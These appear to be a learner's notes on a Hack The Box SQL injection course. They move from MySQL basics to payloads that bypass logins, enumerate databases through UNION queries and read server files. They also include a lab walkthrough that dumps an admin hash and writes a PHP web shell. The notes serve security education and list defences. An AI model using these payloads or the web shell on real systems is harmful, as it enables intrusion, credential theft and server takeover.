* most modern web app utilize a database strucutre on back-end
* databases are used to store and retrieve data related to web app
* SQL Injection
	* most common injection vulnerability
	* when user supplied information is used to construct database queries, malicious users might be able to trick the query into something other than the originial intention
	* Most basic cases: Terminate original query with single quote ' or double quote "

# Intro to databases
* Database Management Systems
	* a DBMS helps create, define, host and manage databases
	* essential features:
		* concurrency
		* consistency
		* Security
		* Reliability
		* Structured Query Language
* Types of databases
	* Relational Databases
		* most common type
		* structures data in tables
		* tables are associated with keys that provide quick database summary or access to the specific row and column when specific data needs to be reviewed
			* relational DBMS -> store the id of other tables in the table
		* the relationship between tables within a database is called a Schema
	* Non-Relational Databases
		* Everything that does not use tables, rows and columns
		* Key-Value
		* Document-Seed
		* Wide-Column
		* Graph

# Intro to MySQL
* SQL Syntax may differ from RDBMS to another, however need to follow ISO standard (https://en.wikipedia.org/wiki/ISO/IEC_9075)
* SQL Actions
	* retrieve data
	* update data
	* delete data
	* create new tables and databases
	* add / remove users
	* assign permissions to these users
* **Command Line**
```shellsession
lunims@htb[/htb]$ mysql -u root -p 
Enter password: <password> 
...SNIP... 
mysql>
```
-u specifies user, -p password. Password can also directly be passed in command, but should be avoided as this would get logged to bash_history file
Remote connection:
```shellsession
lunims@htb[/htb]$ mysql -u root -h docker.hackthebox.eu -P 3306 -p
```
-h specifies host, -P port

Keep in mind: MySQL expects CLI queries to be terminated with semicolons
Creating a database:
```mysql
CREATE DATABASE users;
```
Show Databases:
```mySQL
SHOW DATABASES;
```
Switch to database:
```mysql
USE users;
```
Note: SQL commands are not case sensitive, but table or database names are. Hence it is good practice to specify commands in uppercase to avoid confusion

**Tables:**
```mysql
CREATE TABLE logins ( 
	id INT, 
	username VARCHAR(100), 
	password VARCHAR(100), 
	date_of_joining DATETIME 
);
```
Show all tables in database:
```mysql
SHOW TABLES;
```
DESCRIBE keyword is used to list the table structure with its fields and data types:
```mysql
DESCRIBE logins;
```

**Table Properties**
Within CREATE TABLE query there are many properties that can be set for the table and each column. For example, id can be set to auto-increment using the AUTO_INCREMENT keywords
```mysql
id INT NOT NULL AUTO_INCREMENT,
```
NOT NULL ensures that column is never left empty
```mysql
username VARCHAR(100) UNIQUE NOT NULL,
```
Default keyword: set a default value 
```mysql
date_of_joining DATETIME DEFAULT NOW(),
```
Primary Key: uniquely identifies a table entry
```mysql
PRIMARY KEY (id)
```

## SQL Statements
**INSERT** statement adds new records to given table
```sql
INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);
```
**SELECT** statement retrieves data from tables
```sql
SELECT * FROM table_name;
SELECT column1, column2 FROM table_name;
```
**DROP** statement removes tables and databases
```sql
DROP TABLE logins;
```
**ALTER** statement changes name of any table or any of its fields or to delete/add any new columns to table
```sql
ALTER TABLE logins ADD newColumn INT;
ALTER TABLE logins RENAME COLUMN newColumn TO newerColumn; -- renames column
ALTER TABLE logins MODIFY newerColumn DATE; -- changes data type 
ALTER TABLE logins DROP newerColumn; -- drops a column
```
**UPDATE** statement can be used to update specific records within a table, based on certain conditions
```sql
UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;
```
**Task Query**: 
```sql
SELECT * FROM departments;
```
## Query Results
**Sorting Results** with **ORDER BY** and specifying the column to sort by
```sql
SELECT * FROM logins ORDER BY password; -- per default in ascending order
SELECT * FROM logins ORDER BY password DESC; -- we can specify DESC or ASC
SELECT * FROM logins ORDER BY password DESC, id ASC; -- also possible to sort by multiple columns
```
We can limit the results retrieved with **LIMIT** keyword
```sql
SELECT * FROM logins LIMIT 2;
SELECT * FROM logins LIMIT 1, 2; -- limit with an offset
```
To filter or search for specific data, we can use conditions with the SELECT statement using **WHERE**
```sql
SELECT * FROM table_name WHERE <condition>;
SELECT * FROM logins WHERE id > 1;
SELECT * FROM logins where username = 'admin';
```
**LIKE** enables selecting records by matching a certain pattern
```sql
SELECT * FROM logins WHERE username LIKE 'admin%'; -- % is wildcard
SELECT * FROM logins WHERE username like '___'; -- _ is wildcard for exactly one character
```
**Task Query:** 
```sql
SELECT last_name FROM employees WHERE first_name LIKE 'bar%' AND hire_date = '1990-01-01';
```
## SQL Operators
**AND** operator takes two conditions and returns true if both conditions are matched:
```sql
condition1 AND condition2
```
**OR** operators takes two conditions and returns true if one condition is matched:
```sql
condition1 OR condition2
```
**NOT** operator simply toggles a boolean value, i.e. negating it
```sql
SELECT NOT 1 = 1; -- will return 0
SELECT NOT 1 = 2; -- will return 1
```
**Symbol Operators**: AND, OR and NOT can respectively represented as &&, || and !

**Multiple Operator Precedence**:
* Division (/), Multiplication (\*), Modulus (%)
* Addition (+), Substraction (-)
* Comparison (=, <, >, <=, >=, !=, LIKE)
* NOT (!)
* AND (&&)
* OR (||)
Examples:
```sql
SELECT * FROM logins WHERE username != 'tom' AND id > 3 - 2;
SELECT * FROM logins WHERE username != 'tom' AND id > 1;
```
**Task Query:** SELECT * from titles WHERE emp_no > 10000 OR title NOT LIKE '%engineer%';

# SQL Injections
* Web Apps usually use user input when retrieving data
* If not securely coded: it may cause a variety of issues like SQL Injection
	* unsafe: Directly passing it to SQL query without sanitization 
* Injection occurs when attacker breaks out of original string by injecting a special character like ' and append his own query
```sql
select * from logins where username like '%$searchInput' -- original query
```
User inputs: `'%1'; DROP TABLE users;'`
Resulting Query:
```sql
select * from logins where username like '%1'; DROP TABLE users;' 
```
Note: This will throw a sytanx error

**Types of SQL Injection**:
* In-band
	* Union-based
	* Error-based
* Blind
	* Boolean Based
	* Timing Based
* Out-of-band

Note: In this module only Union-based SQL Injections

## Subverting Query Logic
**SQLi Discovery**:
Try to inject special charcters first and see how the page reacts (`', ", #, ), ;`)

**OR Injection**
Inject OR condition with a basic cond like 1=1, so that the OR evaluates to true. 
Example cond: admin' OR '1' = '1 
```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```
![[sql_injection.md.png]]
* AND Operators is evaluated first
	* 1=1 is true
	* password='something' is false
	* result of AND cond is false
* Next, OR operator 
	* if username='admin' exists the entire query returns True
	* The `'1'='1'` condition is irrelevant in this context because it doesn't affect the outcome of the `AND` condition
=> The Query will return if admin username exists and authentication is bypassed
**Task Payload:** tom' OR '1'='1

## Using Comments
Comments in MySQL:
* `-- ` (with a space)
* `#`
* `/**/` in-line comment (typically not relevant for SQLi)

Inject comment payload in Auth Query: `admin'-- `
```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```
Authentication mechanism is commented out
Keep in mind: Syntax needs to check out, so sometimes a character like parentheses is needed in attacking payload: `admin')-- `
**Task Payload:** foo' OR id=5)-- 

## Union Clause
**UNION** clause is used to combine results from multiple SELECT statements
-> Through UNION injection, we will be able to SELECT and dump data from all across the DBMS, from multiple tables and databases. 
```sql
SELECT * FROM ports UNION SELECT * FROM ships;
```
**Even Columns**:
A UNION statement can only operate on a SELECT with an equal number of columns.
-> we can just append our own values to a SELECT query, so that it matches the number of columns of the other SELECT statement
```sql
SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '
-- 2,3, 4 are inserted values so that the number of columns of products is matched
```
**Task Query:** 
```sql
SELECT * FROM employees UNION SELECT dept_no, dept_name, 3, 4, 5, 6 FROM departments;
```
### Union Injection
**Detect number of columns**:

**Using Order BY**:
Start with `order by 1`, if successfull it must have at least one column. Iteratively go upwards, until we meet an error

**Using Union**
Attempt a UNION injection with a different number of columns until we successfully get results back

**Location of Injection**
While a query may return multiple columns, web app may only display some of them. Thus, we need to inject our payload into a column that is printed on the page, so we can see the results

**Task Payload:** cn' UNION select 1, user(), 3, 4-- 

# Exploitation

## Database Enumeration
### MySQL Fingerprinting 
Before enumerating, we usually need to identify the type of DBMS we are dealing with
-> each DBMS has different queries

The following queries tell us if we are dealing with MySQL:

| Payload          | When to use                      | Expected Output            | Wrong Output                                              |
| ---------------- | -------------------------------- | -------------------------- | --------------------------------------------------------- |
| SELECT @@version | when we have full query output   | MySQL Version              | In MSSQL it returns MSSQL version. Error with other DBMS. |
| SELECT POW(1,1)  | When we only have numeric output | 1                          | error with other dbms                                     |
| SELECT SLEEP(5)  | Blind/no output                  | delays page response by 5s | will not delay response with other dbms                   |
### INFORMATION_SCHEMA Database
INFORMATION_SCHEMA database contains metadata about the databases and tables present on the server. Can not simply be called with SELECT as this is a different database.

To reference a table present in another DB, we can use the '.' operator 
```mysql
SELECT * FROM my_database.users;
```
### SCHEMATA
The table SCHEMATA in INFORMATION_SCHEMA db contains information about all databases on the server. It's used to obtain db names so we can query them
```mysql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```
We can also find out the current database running with:
```mysql
SELECT database()
```
### TABLES
To find all tables within a db, we can use the TABLES table in the INFORMATION_SCHEMA Database.
```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```
### COLUMNS
To dump the data of a certain table, we first need to find the column names in the table. This an be found in the COLUMNS table of INFORMATION_SCHEMA db.
COLUMN_NAME, TABLE_NAME and TABLE_SCHEMA
```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

**Task:**
Find columns of user table in ilfreight:
```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -
```
We have password column. So resulting payload is:
```sql
cn' UNION select 1, password, 3, 4 from users where username='newuser'-- -
```

## Reading Files
**DB User**
First, we have to determine, which user we are within db. It's becoming more required in modern DBMSes to need database administrator (DBA) privileges. If DBA rights are given, it is more probable to also have file-read privileges
Find current user:
```mysql
SELECT USER() SELECT CURRENT_USER() SELECT user from mysql.user
```

**User Privileges**
Test if we have super admin privileges
```mysql
SELECT super_priv FROM mysql.user
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
-- Select a specific user
```
If this returns `Y`, this means YES
Dump other privileges:
```mysql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```
Only show current user root privileges:
```mysql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```
**LOAD_FILE**
```mysql
SELECT LOAD_FILE('/etc/passwd');
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```
We could also inspect source code of web pages to look out for other vulnerabilities.

**Task Payload:**
```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
```

### Writing Files
**Writing File Privileges**
For writing files to the back-end server using MySQL db we require three things:
1. User with FILE privilege needed
2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server

**secure_file_priv**
This variable is used to determine where to read/write files from. An empty value lets us read files from the entire filesystem. Otherwise, if a certain directory is set we can only read from the folder specified by the variable. NULL means that we cannot read/write from any directory.
Note: MySQL uses `/var/lib/mysql-files` as the default folder
```mysql
SHOW VARIABLES LIKE 'secure_file_priv'; -- check value of secure_file_priv
```
SELECT statement for UNION based injections needed:
```mysql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

**SELECT INTO OUTFILE:**
SELECT INTO OUTFILE can be used to write data from select queries into files. 

```mysql
SELECT * from users INTO OUTFILE '/tmp/credentials';
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt'; -- strings are also possible
```

We can use this to write files which are accessible on the webserver, e.g. for a reverse shell or web shell

**Note:** To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

With this we can browse shell.php and execute commands via 0 parameter, e.g. ?0=id

**Task URL:** http://154.57.164.75:30575/shell.php?0=cat%20../flag.txt

# Mitigations
* Input Sanitization
	* [mysqli_real_escape_string()](https://www.php.net/manual/en/mysqli.real-escape-string.php)
	* [pg_escape_string()](https://www.php.net/manual/en/function.pg-escape-string.php)
* Input Validation
	*  [preg_match()](https://www.php.net/manual/en/function.preg-match.php)
* User Privileges
	* enforce principal of least privilege
	* Superusers and users with administrative privileges should never be used with web applications
* Web Application Firewall
* Parameterized Queries or Prepared Statements
	* [mysqli_stmt_bind_param()](https://www.php.net/manual/en/mysqli-stmt.bind-param.php)

# Skill Assessment

At first i started trying SQL Injections on the login form (with SQLmap) and saw that this might be a dead end. So i went over to the Create Account form, where the invitation code seems to be vulnerable:
With following Payload i was successfully able to create an account:
`username=username&password=h4rdtoguess%21&repeatPassword=h4rdtoguess%21&invitationCode=abcd-efgh-1234`

After some searching i found, that the q paramter over the search is vulnerable as well (500 status code on single quote). This is the point which helps us to answer the questions.
After some payload testing with UNIONs i found following working payload:
```sql
') UNION SELECT 1,2,3,4-- -
```
With this i know that we need 4 columns for our UNION payload and that 3 and 4 are displayed.
With this i was able to enumerate 

```mysql
') UNION SELECT 1,2,database(),4-- -
```
This shows, that the current database is chattr.
Now we can take a look at its tables:
```mysql
)' UNION select 1,2, TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='chattr'-- -
```
We find the Tables Users, Invitation Codes and Messages. Now we only need to figure out the columns:
```mysql
' UNION select 1,2,TABLE_NAME,COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='User'-- -
```
We find the table Password. We are now able to find the hash:
```mysql
') UNION SELECT 1,2,Password,4 FROM Users WHERE Username='admin'-- -
```
To find out the root directory, i first take a look at the Server Response header, telling me that this is a nginx. Hence i load following Config files:
```mysql
') UNION SELECT 1,2,3, LOAD_FILE("/etc/nginx/nginx.conf")-- -
') UNION SELECT 1,2,3, LOAD_FILE("/etc/nginx/sites-enabled/default")-- -
```
The base dir is /var/www/chattr-prod. With this we are able to write files (i did not bother to check the permissions as the task basically tells me that we are allowed to write files)
```mysql
)' UNION SELECT "", "", "" ,'<?php system($_REQUEST[0]); ?>' INTO OUTFILE '/var/www/chattr-prod/shell.php'-- -
```
With this I am able to browse our web sell with `.../shell?0=ls` and thus I found the flag in the root directory.
